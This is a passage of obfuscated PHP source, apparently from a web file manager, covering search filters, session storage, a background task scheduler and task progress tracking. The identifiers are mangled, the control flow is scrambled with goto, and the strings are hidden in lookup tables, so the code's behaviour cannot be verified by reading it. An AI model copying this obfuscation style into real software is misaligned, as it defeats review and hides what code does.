unset($cÃšïÍë×Õ[$Dê¢éÉ³‡[28]]); goto b Ş´‘÷‘; A´½ÖÖŸ: $Dê¢éÉ³‡ =& $_SERVER[ä°„ä°º]; if (!isset($dó™¤ÔªğŠ[$Dê¢éÉ³‡[1803]]) || !$dó™¤ÔªğŠ[$Dê¢éÉ³‡[1803]]) { return; } if (!Input::check($dó™¤ÔªğŠ[$Dê¢éÉ³‡[1803]], $Dê¢éÉ³‡[316]) || strlen($dó™¤ÔªğŠ[$Dê¢éÉ³‡[1803]]) < 2) { return; } goto bÙ§º†è³; bÙ§º†è³: $A®ëğ”¾šÁ = "\114\x45\x46\124\40\x4a\x4f\x49\x4e\x20{$this->tablePrefix}\151\157\137\x73\157\x75\x72\143\145\137\x6d\145\x74\x61\40\x6d\x65\x74\141\40\157\x6e\x20\x73\157\165\x72\143\x65\56\163\x6f\x75\x72\x63\145\x49\x44\40\75\x20\155\x65\164\x61\56\x73\157\165\x72\x63\x65\x49\x44"; $eò“˜î÷Ä = array(); $CÄ¥Ñ›«º± = str_replace(array($Dê¢éÉ³‡[229], $Dê¢éÉ³‡[50], $Dê¢éÉ³‡[1968]), $Dê¢éÉ³‡[33], $CÄ¥Ñ›«º±); goto E×éù¶°ˆˆ; c¥Ô©¼‰“Ş: } private function _parseSearchWhere($Aò «Í—‰Ğ) { goto dÒøöø˜‚§; DÂÇ…Áš¡: if (isset($Aò «Í—‰Ğ[$EÓ«Éæ¾À[476]]) && $Aò «Í—‰Ğ[$EÓ«Éæ¾À[476]]) { $aë‚³ŠªäÖ = array($EÓ«Éæ¾À[1975], $Aò «Í—‰Ğ[$EÓ«Éæ¾À[476]]); if ($cóùÆÃ¶ªÒ[$EÓ«Éæ¾À[84]]) { $cóùÆÃ¶ªÒ[$EÓ«Éæ¾À[84]] = array($cóùÆÃ¶ªÒ[$EÓ«Éæ¾À[84]], $aë‚³ŠªäÖ, $EÓ«Éæ¾À[1976]); } else { $cóùÆÃ¶ªÒ[$EÓ«Éæ¾À[84]] = $aë‚³ŠªäÖ; } } if (isset($Aò «Í—‰Ğ[$EÓ«Éæ¾À[1965]]) && $Aò «Í—‰Ğ[$EÓ«Éæ¾À[1965]] > 0) { $cóùÆÃ¶ªÒ[$EÓ«Éæ¾À[78]] = array($EÓ«Éæ¾À[1974], $Aò «Í—‰Ğ[$EÓ«Éæ¾À[1965]]); } if (isset($Aò «Í—‰Ğ[$EÓ«Éæ¾À[1966]]) && $Aò «Í—‰Ğ[$EÓ«Éæ¾À[1966]]) { $aë‚³ŠªäÖ = array($EÓ«Éæ¾À[1975], $Aò «Í—‰Ğ[$EÓ«Éæ¾À[1966]]); if ($cóùÆÃ¶ªÒ[$EÓ«Éæ¾À[78]]) { $cóùÆÃ¶ªÒ[$EÓ«Éæ¾À[78]] = array($cóùÆÃ¶ªÒ[$EÓ«Éæ¾À[78]], $aë‚³ŠªäÖ, $EÓ«Éæ¾À[1976]); } else { $cóùÆÃ¶ªÒ[$EÓ«Éæ¾À[78]] = $aë‚³ŠªäÖ; } } goto cÖâ×Û‘Á–; cÖâ×Û‘Á–: if (isset($Aò «Í—‰Ğ[$EÓ«Éæ¾À[575]]) && $Aò «Í—‰Ğ[$EÓ«Éæ¾À[575]]) { $cóùÆÃ¶ªÒ[] = array($EÓ«Éæ¾À[434] => $Aò «Í—‰Ğ[$EÓ«Éæ¾À[575]], $EÓ«Éæ¾À[432] => $Aò «Í—‰Ğ[$EÓ«Éæ¾À[575]], $EÓ«Éæ¾À[979] => $EÓ«Éæ¾À[1807]); } if (isset($Aò «Í—‰Ğ[$EÓ«Éæ¾À[405]]) && $Aò «Í—‰Ğ[$EÓ«Éæ¾À[405]]) { $c…äö´…›¿ = $Aò «Í—‰Ğ[$EÓ«Éæ¾À[405]]; if ($c…äö´…›¿ == $EÓ«Éæ¾À[77]) { $cóùÆÃ¶ªÒ[$EÓ«Éæ¾À[403]] = 1; } else { if ($c…äö´…›¿ == $EÓ«Éæ¾À[1977]) { $cóùÆÃ¶ªÒ[$EÓ«Éæ¾À[403]] = 0; } else { if ($c…äö´…›¿) { $c…äö´…›¿ = is_array($c…äö´…›¿) ? $c…äö´…›¿ : explode($EÓ«Éæ¾À[47], $c…äö´…›¿); $cóùÆÃ¶ªÒ[$EÓ«Éæ¾À[405]] = array($EÓ«Éæ¾À[411], $c…äö´…›¿); $cóùÆÃ¶ªÒ[$EÓ«Éæ¾À[403]] = 0; } } } } if (isset($Aò «Í—‰Ğ[$EÓ«Éæ¾À[478]]) && $Aò «Í—‰Ğ[$EÓ«Éæ¾À[478]]) { $B±ª¶ˆÇ£ = $this->sourceInfo($Aò «Í—‰Ğ[$EÓ«Éæ¾À[478]]); $cóùÆÃ¶ªÒ[$EÓ«Éæ¾À[566]] = array($EÓ«Éæ¾À[525], $B±ª¶ˆÇ£[$EÓ«Éæ¾À[502]] . $Aò «Í—‰Ğ[$EÓ«Éæ¾À[478]] . $EÓ«Éæ¾À[526]); } goto BÑê–Å¢ô½; dÒøöø˜‚§: $EÓ«Éæ¾À =& $_SERVER[ä°„ä°º]; $cóùÆÃ¶ªÒ = array(); if (isset($Aò «Í—‰Ğ[$EÓ«Éæ¾À[744]]) && $Aò «Í—‰Ğ[$EÓ«Éæ¾À[744]]) { $cóùÆÃ¶ªÒ[$EÓ«Éæ¾À[84]] = array($EÓ«Éæ¾À[1974], $Aò «Í—‰Ğ[$EÓ«Éæ¾À[744]]); } goto DÂÇ…Áš¡; BÑê–Å¢ô½: if (isset($Aò «Í—‰Ğ[$EÓ«Éæ¾À[1803]]) && trim($Aò «Í—‰Ğ[$EÓ«Éæ¾À[1803]])) { $bß‰³ÍŒŸê = trim($Aò «Í—‰Ğ[$EÓ«Éæ¾À[1803]]); $b¶ ö…ÇáÉ = explode($EÓ«Éæ¾À[50], $bß‰³ÍŒŸê); if (strlen($bß‰³ÍŒŸê) > 2 && (substr($bß‰³ÍŒŸê, 0, 1) == $EÓ«Éæ¾À[116] && substr($bß‰³ÍŒŸê, -1) == $EÓ«Éæ¾À[116]) || substr($bß‰³ÍŒŸê, 0, 1) == $EÓ«Éæ¾À[55] && substr($bß‰³ÍŒŸê, -1) == $EÓ«Éæ¾À[55]) { $bß‰³ÍŒŸê = substr($bß‰³ÍŒŸê, 1, -1); $b¶ ö…ÇáÉ = array($bß‰³ÍŒŸê); } $cóùÆÃ¶ªÒ[$EÓ«Éæ¾À[28]] = array(array($EÓ«Éæ¾À[525], $EÓ«Éæ¾À[1805] . $bß‰³ÍŒŸê . $EÓ«Éæ¾À[1805])); if (count($b¶ ö…ÇáÉ) > 1) { $cóùÆÃ¶ªÒ[$EÓ«Éæ¾À[28]] = array(); foreach ($b¶ ö…ÇáÉ as $DÙ»ƒà¥åØ) { if (!trim($DÙ»ƒà¥åØ)) { continue; } $cóùÆÃ¶ªÒ[$EÓ«Éæ¾À[28]][] = array($EÓ«Éæ¾À[525], $EÓ«Éæ¾À[1805] . trim($DÙ»ƒà¥åØ) . $EÓ«Éæ¾À[1805]); } } } return $cóùÆÃ¶ªÒ; goto CÑĞé§‹; CÑĞé§‹: } } goto e¹ºƒõçèó; F´…µŸ±ò: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto F¨šì¿™”Í; e…‹·¹±ğŠ: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $fÈ”®ªŞÔØ = new self(); return $fÈ”®ªŞÔØ; goto C£Õ¶Ÿæ‚°; aç±ôĞ®´Ô: $c¥…¸–‚å = $GLOBALS[$CÅßÕ™’×[6]][$CÅßÕ™’×[347]]; self::$sessionTime = $c¥…¸–‚å[$CÅßÕ™’×[1510]]; $BáÅÏñ¯Ä½ = isset($GLOBALS[$CÅßÕ™’×[1511]]) ? $GLOBALS[$CÅßÕ™’×[1511]] : SESSION_ID; goto D¨¿õ²²‘®; F¨šì¿™”Í: $CÅßÕ™’× =& $_SERVER[ä°„ä°º]; static $fÈ”®ªŞÔØ = false; if ($fÈ”®ªŞÔØ) { return $fÈ”®ªŞÔØ; } goto aç±ôĞ®´Ô; B­Çè¤ê§: $b÷‰½»óÕ£ = $c¥…¸–‚å[$FÚ¨é¡ÏÇ™]; $fèŸŠ„‡ö = $c¥…¸–‚å[$CÅßÕ™’×[816]]; switch ($FÚ¨é¡ÏÇ™) { case $CÅßÕ™’×[17]: self::$handle = Model($CÅßÕ™’×[817]); break; case $CÅßÕ™’×[818]: self::$handle = new CacheRedis($b÷‰½»óÕ£, $fèŸŠ„‡ö); break; case $CÅßÕ™’×[819]: self::$handle = new CacheMemcached($b÷‰½»óÕ£, $fèŸŠ„‡ö); break; case $CÅßÕ™’×[193]: $b÷‰½»óÕ£[$CÅßÕ™’×[76]] = $b÷‰½»óÕ£[$CÅßÕ™’×[76]] . $CÅßÕ™’×[1513]; self::$handle = new CacheFile($b÷‰½»óÕ£, $fèŸŠ„‡ö); default: break; } goto e…‹·¹±ğŠ; D¨¿õ²²‘®: if (self::$sessionSign) { } else { if (Cookie::get($BáÅÏñ¯Ä½)) { self::$sessionSign = Cookie::get($BáÅÏñ¯Ä½); } else { self::$sessionSign = guid(); } } Cookie::setSafe($BáÅÏñ¯Ä½, self::$sessionSign, self::$sessionTime); $FÚ¨é¡ÏÇ™ = $c¥…¸–‚å[$CÅßÕ™’×[1512]]; goto B­Çè¤ê§; C£Õ¶Ÿæ‚°: } public static function sign($F¸«Ûëñ¤ = false) { $F¸«Ûëñ¤ && (self::$sessionSign = $F¸«Ûëñ¤); self::init(); return self::$sessionSign; } public static function set($c‚Ğ°—Úñó, $E…Ç³ÚœÚë = false) { self::init(); if (is_array($c‚Ğ°—Úñó)) { foreach ($c‚Ğ°—Úñó as $FÙÙÏÜñ‰  => $A‹ƒª«ìÙ) { array_set_value(self::$data, $FÙÙÏÜñ‰ , $A‹ƒª«ìÙ); } } else { array_set_value(self::$data, $c‚Ğ°—Úñó, $E…Ç³ÚœÚë); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($fÁ¼¤Ûø¡Ê = false) { self::init(); if (!$fÁ¼¤Ûø¡Ê) { return self::$data; } return array_get_value(self::$data, $fÁ¼¤Ûø¡Ê); } public static function remove($FÍç“È”¨˜) { self::init(); unset(self::$data[$FÍç“È”¨˜]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ä°„ä°º][821])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { goto FãÔ¨óø¯; c”º—ƒ±¢æ: while (!0) { self::cacheClear(); if (self::valueGet($eààÙ›ƒ¦[733]) != $eààÙ›ƒ¦[87]) { self::valueSet($eààÙ›ƒ¦[1514], $eààÙ›ƒ¦[191]); self::log($eààÙ›ƒ¦[1518]); die; } self::valueSet($eààÙ›ƒ¦[1514], $eààÙ›ƒ¦[87]); self::valueSet($eààÙ›ƒ¦[1515], time()); self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } goto fŒáƒäŠ…; B©ÏƒòåëÂ: http_close(); self::valueSet($eààÙ›ƒ¦[1514], $eààÙ›ƒ¦[87]); Hook::bind($eààÙ›ƒ¦[1516], $eààÙ›ƒ¦[1517]); goto c”º—ƒ±¢æ; FãÔ¨óø¯: $eààÙ›ƒ¦ =& $_SERVER[ä°„ä°º]; if (self::valueGet($eààÙ›ƒ¦[733]) != $eààÙ›ƒ¦[87]) { return; } if (self::valueGet($eààÙ›ƒ¦[1514]) == $eààÙ›ƒ¦[87]) { $DÜöĞïÜœ  = self::valueGet($eààÙ›ƒ¦[1515]); if (time() - $DÜöĞïÜœ  > self::AUTO_RESTART_TIME) { self::restart(); } return; } goto B©ÏƒòåëÂ; fŒáƒäŠ…: } public static function restart() { $eÎœå¹×ê =& $_SERVER[ä°„ä°º]; http_close(); self::valueSet($eÎœå¹×ê[733], $eÎœå¹×ê[191]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet($eÎœå¹×ê[1514], $eÎœå¹×ê[191]); self::valueSet($eÎœå¹×ê[733], $eÎœå¹×ê[87]); } public static function shutdownEvent() { $Dò¹Æ’Ÿ¦Ü =& $_SERVER[ä°„ä°º]; self::valueSet($Dò¹Æ’Ÿ¦Ü[1514], $Dò¹Æ’Ÿ¦Ü[191]); self::log($Dò¹Æ’Ÿ¦Ü[1519]); } public static function config($aòì¥äÙ™ , $C«è˜»Ìä) { self::valueSet($_SERVER[ä°„ä°º][733], $aòì¥äÙ™ ); } private static function taskRunAll() { goto EÈÀ§ç¸œğ; câÖ‡í¬: self::taskQueueRun($cÕ±Ñî›‚ó); goto f‘ŠâÅ¹; EÎ¹ğà¿ù‡: $eêÏÚ“š˜˜ = count($a§œïöƒ‘); for ($E£èÄ‹ö¾ø = 0; $E£èÄ‹ö¾ø < $eêÏÚ“š˜˜; $E£èÄ‹ö¾ø++) { $dÏÃÆÇ‹èÚ = $a§œïöƒ‘[$E£èÄ‹ö¾ø]; if (!$dÏÃÆÇ‹èÚ[$FÊµ·°é»Ÿ[393]] || $dÏÃÆÇ‹èÚ[$FÊµ·°é»Ÿ[1521]] != $FÊµ·°é»Ÿ[87]) { continue; } if (!self::taskTimeCheck($dÏÃÆÇ‹èÚ)) { continue; } self::taskRun($dÏÃÆÇ‹èÚ); } Hook::trigger($FÊµ·°é»Ÿ[1522]); goto câÖ‡í¬; EÈÀ§ç¸œğ: $FÊµ·°é»Ÿ =& $_SERVER[ä°„ä°º]; $cÕ±Ñî›‚ó = timeFloat(); $a§œïöƒ‘ = Model($FÊµ·°é»Ÿ[1520])->listData(); goto EÎ¹ğà¿ù‡; f‘ŠâÅ¹: } private static function taskQueueRun($eÖ“ÒĞÔÊ) { $a·Şä‡¸¯Å = 10; while (!0) { $b­ÉæÇàëÊ = TaskQueue::run(); if ($b­ÉæÇàëÊ === !1) { break; } if (timeFloat() - $eÖ“ÒĞÔÊ >= $a·Şä‡¸¯Å) { break; } } } private static function taskTimeCheck($Eë·ñ´î•Š) { goto DÍ‘É†ÁŒ; Cñ«òõÌŒê: $Fº•ÉÇÑÏÄ = strtotime($FÈØæºï¥[1523] . $e‹µà‘ó†®[$FÈØæºï¥[1524]] . $FÈØæºï¥[1525]) - strtotime($FÈØæºï¥[1526]); $DÌÁ¼¤º‘ = time() - strtotime(date($FÈØæºï¥[1527]) . $FÈØæºï¥[1528]); $C¸Æò¥Ë± = $DÌÁ¼¤º‘ >= $Fº•ÉÇÑÏÄ && $DÌÁ¼¤º‘ <= $Fº•ÉÇÑÏÄ + 3600; goto bË‘—¤ˆŠ”; DÍ‘É†ÁŒ: $FÈØæºï¥ =& $_SERVER[ä°„ä°º]; $e‹µà‘ó†® = json_decode($Eë·ñ´î•Š[$FÈØæºï¥[197]], !0); $cÙ“÷Ñ”ÂÓ = intval($Eë·ñ´î•Š[$FÈØæºï¥[1515]]); goto Cñ«òõÌŒê; bË‘—¤ˆŠ”: switch ($e‹µà‘ó†®[$FÈØæºï¥[29]]) { case $FÈØæºï¥[1529]: if (time() - $cÙ“÷Ñ”ÂÓ < 3600 * 24 * 30) { return !1; } if ($e‹µà‘ó†®[$FÈØæºï¥[1529]] == date($FÈØæºï¥[1530]) && $C¸Æò¥Ë±) { return !0; } break; case $FÈØæºï¥[1531]: if (time() - $cÙ“÷Ñ”ÂÓ < 3600 * 24 * 7) { return !1; } $a¾ÆÙÕŠëÁ = date($FÈØæºï¥[1532]) == 0 ? 7 : date($FÈØæºï¥[1532]); if ($e‹µà‘ó†®[$FÈØæºï¥[1531]] == $a¾ÆÙÕŠëÁ && $C¸Æò¥Ë±) { return !0; } break; case $FÈØæºï¥[1524]: if (time() - $cÙ“÷Ñ”ÂÓ < 3600 * 24) { return !1; } if ($C¸Æò¥Ë±) { return !0; } break; case $FÈØæºï¥[1533]: if (time() - $cÙ“÷Ñ”ÂÓ >= floatval($e‹µà‘ó†®[$FÈØæºï¥[1533]]) * 60) { return !0; } break; default: break; } return !1; goto fõÉè‰ˆ; fõÉè‰ˆ: } private static function closeDatabase() { goto DË¿òëèóË; FØ ¸”¿ÅÔ: $f‰ªÈ™†¨ê = Model($cßÉ³»é‰æ[494])->db($cßÉ³»é‰æ[33]); if ($f‰ªÈ™†¨ê) { $f‰ªÈ™†¨ê->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { write_log($cßÉ³»é‰æ[1534], $cßÉ³»é‰æ[1535]); die; } goto C—‰±„¾‡; BÇ—¨î—î¸: if (!$Aˆ®×ø£««) { $Aˆ®×ø£«« = time(); } if (time() - $Aˆ®×ø£«« < $E¨ÜÊâ¶¿‚) { return; } $Aˆ®×ø£«« = time(); goto FØ ¸”¿ÅÔ; DË¿òëèóË: $cßÉ³»é‰æ =& $_SERVER[ä°„ä°º]; static $Aˆ®×ø£«« = 0; $E¨ÜÊâ¶¿‚ = 300; goto BÇ—¨î—î¸; C—‰±„¾‡: } public static function taskRun($EÀ¼ñœ¢‹Ñ) { goto EÂ­Ú¥øÄ‹; Eºñ×ùß¤İ: Model($B»±æó‘íç[1540])->add(array($B»±æó‘íç[1541] => $B»±æó‘íç[33], $B»±æó‘íç[1542] => $B»±æó‘íç[191], $B»±æó‘íç[29] => $B»±æó‘íç[1543] . $EÀ¼ñœ¢‹Ñ[$B»±æó‘íç[393]], $B»±æó‘íç[1544] => json_encode(array($B»±æó‘íç[28] => $EÀ¼ñœ¢‹Ñ[$B»±æó‘íç[28]], $B»±æó‘íç[1545] => timeFloat() - $cÕë˜åƒ°, $B»±æó‘íç[291] => $B²ç’¬ÕÓİ)))); $dƒÍŠÙ™È¸ = $B²ç’¬ÕÓİ ? $B»±æó‘íç[1546] . $B²ç’¬ÕÓİ : $B»±æó‘íç[33]; self::log($B»±æó‘íç[1547] . $EÀ¼ñœ¢‹Ñ[$B»±æó‘íç[393]] . $B»±æó‘íç[517] . $dƒÍŠÙ™È¸); goto Cò¸Àèò÷; EÂ­Ú¥øÄ‹: $B»±æó‘íç =& $_SERVER[ä°„ä°º]; self::log($B»±æó‘íç[1536] . $EÀ¼ñœ¢‹Ñ[$B»±æó‘íç[393]] . $B»±æó‘íç[1537] . $EÀ¼ñœ¢‹Ñ[$B»±æó‘íç[28]] . $B»±æó‘íç[1538] . $EÀ¼ñœ¢‹Ñ[$B»±æó‘íç[1539]]); Model($B»±æó‘íç[1520])->run($EÀ¼ñœ¢‹Ñ[$B»±æó‘íç[393]]); goto c‰¢ğÉ¼†™; Cò¸Àèò÷: return !0; goto C¼µôÂ¢¬ß; c‰¢ğÉ¼†™: $cÕë˜åƒ° = timeFloat(); $B²ç’¬ÕÓİ = $B»±æó‘íç[33]; switch ($EÀ¼ñœ¢‹Ñ[$B»±æó‘íç[29]]) { case $B»±æó‘íç[305]: $fñ¸ãêÇ¸Ë = url_request($EÀ¼ñœ¢‹Ñ[$B»±æó‘íç[1539]], $B»±æó‘íç[228], !1, !1, !1, !1, 10); if ($fñ¸ãêÇ¸Ë[$B»±æó‘íç[733]]) { $B²ç’¬ÕÓİ = strlen($fñ¸ãêÇ¸Ë[$B»±æó‘íç[1109]]); } break; case $B»±æó‘íç[227]: $B²ç’¬ÕÓİ = Hook::apply($EÀ¼ñœ¢‹Ñ[$B»±æó‘íç[1539]]); default: break; } goto Eºñ×ùß¤İ; C¼µôÂ¢¬ß: } private static function valueGet($CÅß¿”›·¿) { $F¬ª£Œ®Ãª =& $_SERVER[ä°„ä°º]; $cĞ¬¼…Ê™¶ = $F¬ª£Œ®Ãª[1548]; $b§ª•ÌËğˆ = Model($F¬ª£Œ®Ãª[486])->get($CÅß¿”›·¿, $cĞ¬¼…Ê™¶); if (is_null($b§ª•ÌËğˆ)) { Model($F¬ª£Œ®Ãª[486])->set($F¬ª£Œ®Ãª[733], $F¬ª£Œ®Ãª[87], $cĞ¬¼…Ê™¶); Model($F¬ª£Œ®Ãª[486])->set($F¬ª£Œ®Ãª[1514], $F¬ª£Œ®Ãª[191], $cĞ¬¼…Ê™¶); $b§ª•ÌËğˆ = Model($F¬ª£Œ®Ãª[486])->get($CÅß¿”›·¿, $cĞ¬¼…Ê™¶); } return $b§ª•ÌËğˆ; } private static function valueSet($DİŞï§‡„î, $b¦ÚªÕ…æÁ) { $Bé»ò‚Š¢è =& $_SERVER[ä°„ä°º]; $Bë‰ÊŞâ = $Bé»ò‚Š¢è[1549]; CacheLock::lock($Bë‰ÊŞâ); $fÂš¥á‚•Ò = Model($Bé»ò‚Š¢è[486])->set($DİŞï§‡„î, $b¦ÚªÕ…æÁ, $Bé»ò‚Š¢è[1548]); CacheLock::unlock($Bë‰ÊŞâ); return $fÂš¥á‚•Ò; } protected static function log($fºÉš¶ ğ³) { write_log($fºÉš¶ ğ³, $_SERVER[ä°„ä°º][1535]); } private static function cacheClear() { $b×í×÷º©‘ =& $_SERVER[ä°„ä°º]; Cache::clearMemory(Model($b×í×÷º©‘[486])->cacheKey($b×í×÷º©‘[1548])); Cache::clearMemory(Model($b×í×÷º©‘[486])->cacheKey($b×í×÷º©‘[1550])); Model($b×í×÷º©‘[1520])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\164\x6f\x70"; const STATYS_RUNNING = "\162\x75\x6e\x6e\151\156\x67"; const STATYS_KILL = "\153\151\154\154"; public $task; public function __destruct() { $this->end(); } public function __construct($cöÍ®ˆÕ”, $bÌáÈšÏÜÀ = '', $DáôŒÆ‚ëô = 0, $BµšÓ¯÷Ä = '') { goto d¶ÉÛª“–„; d¶ÉÛª“–„: $cÓÏ•óİ˜¡ =& $_SERVER[ä°„ä°º]; if (self::get($cöÍ®ˆÕ”)) { return; } $this->task = array($cÓÏ•óİ˜¡[393] => $cöÍ®ˆÕ”, $cÓÏ•óİ˜¡[1551] => USER_ID, $cÓÏ•óİ˜¡[1454] => $BµšÓ¯÷Ä, $cÓÏ•óİ˜¡[29] => $bÌáÈšÏÜÀ, $cÓÏ•óİ˜¡[1044] => $cÓÏ•óİ˜¡[33], $cÓÏ•óİ˜¡[1042] => $DáôŒÆ‚ëô, $cÓÏ•óİ˜¡[1057] => 0, $cÓÏ•óİ˜¡[1552] => 0, $cÓÏ•óİ˜¡[1553] => 0, $cÓÏ•óİ˜¡[772] => timeFloat(), $cÓÏ•óİ˜¡[771] => 0, $cÓÏ•óİ˜¡[1554] => 0, $cÓÏ•óİ˜¡[1555] => 0, $cÓÏ•óİ˜¡[1556] => 0, $cÓÏ•óİ˜¡[733] => $cÓÏ•óİ˜¡[1514]); goto fËƒÇñÔŒ; fŞŠß‚ƒ‹: $this->startAfter(); Hook::trigger($cÓÏ•óİ˜¡[1561], $this->task); $this->task[$cÓÏ•óİ˜¡[1554]] = timeFloat(); goto Aàù„Ì…¸; fËƒÇñÔŒ: $GLOBALS[$cÓÏ•óİ˜¡[1557]] = 1; Hook::bind($cÓÏ•óİ˜¡[1516], array($this, $cÓÏ•óİ˜¡[1558])); Hook::bind($cÓÏ•óİ˜¡[1559], array($this, $cÓÏ•óİ˜¡[1560])); goto fŞŠß‚ƒ‹; Aàù„Ì…¸: } public function end() { goto CÇÃ¹¦…¯; CÇÃ¹¦…¯: $C®‰æë‚‚ =& $_SERVER[ä°„ä°º]; if (!$this->task) { return; } if ($this->task[$C®‰æë‚‚[1554]]) { self::valueSet($this->task[$C®‰æë‚‚[393]], !1); } goto b©ã«­ÖòŞ; dèÃòòĞàØ: Hook::unbind($C®‰æë‚‚[1559], array($this, $C®‰æë‚‚[1560])); $this->endAfter(); $this->task = !1; goto Cˆ½¡Â·¨; b©ã«­ÖòŞ: $càŸ–ê…Ì¶ = timeFloat() - $this->task[$C®‰æë‚‚[772]]; self::log($C®‰æë‚‚[1562] . $this->task[$C®‰æë‚‚[393]] . $C®‰æë‚‚[1563] . $càŸ–ê…Ì¶ . $C®‰æë‚‚[1564]); Hook::unbind($C®‰æë‚‚[1516], array($this, $C®‰æë‚‚[1558])); goto dèÃòòĞàØ; Cˆ½¡Â·¨: } public function update($EÜ¯¸îİ‹ë = 0, $eÕöÎ…•¿µ = false) { goto F÷ùÂ×’Ò; E›¨Úàé½: $bÑß××ƒ“³[$E‚Œ‰£®ÀÅ[733]] = $AÈ÷˜ĞÒ‡Å ? $AÈ÷˜ĞÒ‡Å : $bÑß××ƒ“³[$E‚Œ‰£®ÀÅ[733]]; $bÑß××ƒ“³[$E‚Œ‰£®ÀÅ[1555]] = $Bö‹ó›»šœ[$E‚Œ‰£®ÀÅ[1555]] ? $Bö‹ó›»šœ[$E‚Œ‰£®ÀÅ[1555]] : 0; $bÑß××ƒ“³[$E‚Œ‰£®ÀÅ[1554]] = timeFloat(); goto b¡èèÚš·Ê; F÷ùÂ×’Ò: $E‚Œ‰£®ÀÅ =& $_SERVER[ä°„ä°º]; $bÑß××ƒ“³ =& $this->task; if (!$bÑß××ƒ“³) { return; } goto D®„ù°‡¹´; B–¡œ×Š…Ì: $Bö‹ó›»šœ = self::get($bÑß××ƒ“³[$E‚Œ‰£®ÀÅ[393]]); $AÈ÷˜ĞÒ‡Å = $Bö‹ó›»šœ[$E‚Œ‰£®ÀÅ[733]]; if ($AÈ÷˜ĞÒ‡Å == self::STATYS_KILL) { $E‚¸¾ŒÚÆ = array($E‚Œ‰£®ÀÅ[1565] => LNG($E‚Œ‰£®ÀÅ[1566]), $E‚Œ‰£®ÀÅ[1107] => !1); Cache::set($E‚Œ‰£®ÀÅ[1567] . $this->task[$E‚Œ‰£®ÀÅ[393]], $E‚¸¾ŒÚÆ, 30); $this->onKill(); $this->end(); die; } else { if ($AÈ÷˜ĞÒ‡Å == self::STATYS_STOP) { $B†Ñœ åòó = 2; $Bö‹ó›»šœ[$E‚Œ‰£®ÀÅ[1555]] += $B†Ñœ åòó; self::valueSet($bÑß××ƒ“³[$E‚Œ‰£®ÀÅ[393]], $Bö‹ó›»šœ); sleep($B†Ñœ åòó); $this->update(); return; } } goto E›¨Úàé½; b¡èèÚš·Ê: Hook::trigger($E‚Œ‰£®ÀÅ[1568], $bÑß××ƒ“³); self::valueSet($bÑß××ƒ“³[$E‚Œ‰£®ÀÅ[393]], $bÑß××ƒ“³); goto fÚºøƒ¹¦; EÑÕ¼ïÊ¦‹: $this->updateAfter(); $A·Ô›ƒÍ¦È = 0.2; if (timeFloat() - $bÑß××ƒ“³[$E‚Œ‰£®ÀÅ[1554]] < $A·Ô›ƒÍ¦È && !$eÕöÎ…•¿µ) { return; } goto B–¡œ×Š…Ì; D®„ù°‡¹´: $bÑß××ƒ“³[$E‚Œ‰£®ÀÅ[1057]] += $EÜ¯¸îİ‹ë; $bÑß××ƒ“³[$E‚Œ‰£®ÀÅ[771]] = timeFloat(); if ($bÑß××ƒ“³[$E‚Œ‰£®ÀÅ[1042]]) { if ($bÑß××ƒ“³[$E‚Œ‰£®ÀÅ[1042]] < $bÑß××ƒ“³[$E‚Œ‰£®ÀÅ[1057]]) { $bÑß××ƒ“³[$E‚Œ‰£®ÀÅ[1042]] = $bÑß××ƒ“³[$E‚Œ‰£®ÀÅ[1057]]; } $dÂÀ–òíÑ… = timeFloat() - $bÑß××ƒ“³[$E‚Œ‰£®ÀÅ[772]] - $bÑß××ƒ“³[$E‚Œ‰£®ÀÅ[1555]]; $bÑß××ƒ“³[$E‚Œ‰£®ÀÅ[1552]] = $bÑß××ƒ“³[$E‚Œ‰£®ÀÅ[1057]] / $bÑß××ƒ“³[$E‚Œ‰£®ÀÅ[1042]]; $bÑß××ƒ“³[$E‚Œ‰£®ÀÅ[1553]] = $bÑß××ƒ“³[$E‚Œ‰£®ÀÅ[1057]] / $dÂÀ–òíÑ…; if ($bÑß××ƒ“³[$E‚Œ‰£®ÀÅ[1552]] > 0) { $bÑß××ƒ“³[$E‚Œ‰£®ÀÅ[1556]] = $dÂÀ–òíÑ… * (1 - $bÑß××ƒ“³[$E‚Œ‰£®ÀÅ[1552]]) / $bÑß××ƒ“³[$E‚Œ‰£®ÀÅ[1552]]; } $bÑß××ƒ“³[$E‚Œ‰£®ÀÅ[1556]] = $bÑß××ƒ“³[$E‚Œ‰£®ÀÅ[1556]] <= 0 ? 0 : $bÑß××ƒ“³[$E‚Œ‰£®ÀÅ[1556]]; } goto EÑÕ¼ïÊ¦‹; fÚºøƒ¹¦: } public function onKillSet($e¼‹Ë¬¹õº, $E†ÍùñáÎğ = array()) { $this->onKillCall = array($e¼‹Ë¬¹õº, $E†ÍùñáÎğ); } public function onKill() { $aÈâõ®¡Ò‡ =& $_SERVER[ä°„ä°º]; self::log($aÈâõ®¡Ò‡[1562] . $this->task[$aÈâõ®¡Ò‡[393]] . $aÈâõ®¡Ò‡[1569]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($f²³‡®ËÏà) { $e‘ˆ˜°«²Ì =& $_SERVER[ä°„ä°º]; Cache::set($e‘ˆ˜°«²Ì[1567] . $this->task[$e‘ˆ˜°«²Ì[393]], $f²³‡®ËÏà, 60); return $f²³‡®ËÏà; } public static function get($B‡¡á»¸ ¤) { $f½İÏÚ°› =& $_SERVER[ä°„ä°º]; $eÆÓ¢ÉŞ™õ = 